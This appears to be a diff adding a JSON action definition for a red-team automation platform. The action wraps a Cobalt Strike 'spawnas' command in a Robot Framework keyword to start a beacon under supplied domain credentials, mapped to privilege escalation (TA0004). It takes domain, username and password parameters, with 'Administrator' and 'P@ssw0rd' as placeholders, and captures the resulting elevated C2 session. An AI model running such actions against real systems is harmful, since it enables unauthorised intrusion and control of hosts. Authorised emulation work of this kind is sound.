@@ -1,0 +1,110 @@
+{
+  "_key": "cs-elevate-spawnas",
+  "name": "Elevate With Spawnas",
+  "description": "Spawn a new beacon process running as a specified domain user",
+  "icon": "\ud83d\udc51",
+  "tactic": "TA0004",
+  "category": "Cobalt Strike",
+  "subcategory": "Privilege Escalation",
+  "riskLevel": "High",
+  "estimatedDuration": 20,
+  "executionType": "cobalt_strike",
+  "robotKeyword": "Elevate With Spawnas",
+  "robotTemplate": "${result}=    Run Bspawnas    ${session}    ${domain}    ${username}    ${password}    ${listener_name}",
+  "inputs": [
+    {
+      "id": "session",
+      "label": "Source Beacon",
+      "type": "Agent_Session",
+      "required": true
+    }
+  ],
+  "outputs": [
+    {
+      "id": "session",
+      "label": "Elevated Session",
+      "type": "Agent_Session"
+    }
+  ],
+  "parameters": [
+    {
+      "id": "session",
+      "label": "Session",
+      "type": "string",
+      "required": true,
+      "placeholder": "${session}"
+    },
+    {
+      "id": "domain",
+      "label": "Domain",
+      "type": "string",
+      "required": true,
+      "placeholder": "a51"
+    },
+    {
+      "id": "username",
+      "label": "Username",
+      "type": "string",
+      "required": true,
+      "placeholder": "Administrator"
+    },
+    {
+      "id": "password",
+      "label": "Password",
+      "type": "string",
+      "required": true,
+      "placeholder": "P@ssw0rd"
+    },
+    {
+      "id": "listener_name",
+      "label": "Listener",
+      "type": "string",
+      "required": true,
+      "placeholder": "HTTP",
+      "default": "HTTP"
+    }
+  ],
+  "requirements": {
+    "c2Server": true,
+    "listeners": [
+      "HTTP"
+    ]
+  },
+  "robotFramework": {
+    "libraries": [
+      "cobaltstrikec2/cobaltstrike.py"
+    ],
+    "keyword": "Elevate With Spawnas",
+    "captureOutput": "ELEVATED_RESULT",
+    "keywordArgs": [
+      {
+        "position": 1,
+        "sessionVariable": "CURRENT_SESSION"
+      },
+      {
+        "position": 2,
+        "param": "domain"
+      },
+      {
+        "position": 3,
+        "param": "username"
+      },
+      {
+        "position": 4,
+        "param": "password"
+      },
+      {
+        "position": 5,
+        "param": "listener_name"
+      }
+    ],
+    "postKeywordStatements": [
+      "@{ELEVATED_SESSIONS}=    Get Sessions By User    ${username}",
+      "${CURRENT_SESSION}=    SET VARIABLE    ${ELEVATED_SESSIONS[0]}"
+    ],
+    "sessionVariable": "CURRENT_SESSION",
+    "variables": [],
+    "preKeywordLog": "Elevating via spawnas as ${domain}\\${username}",
+    "postKeywordLog": "Elevated session acquired"
+  }
+}
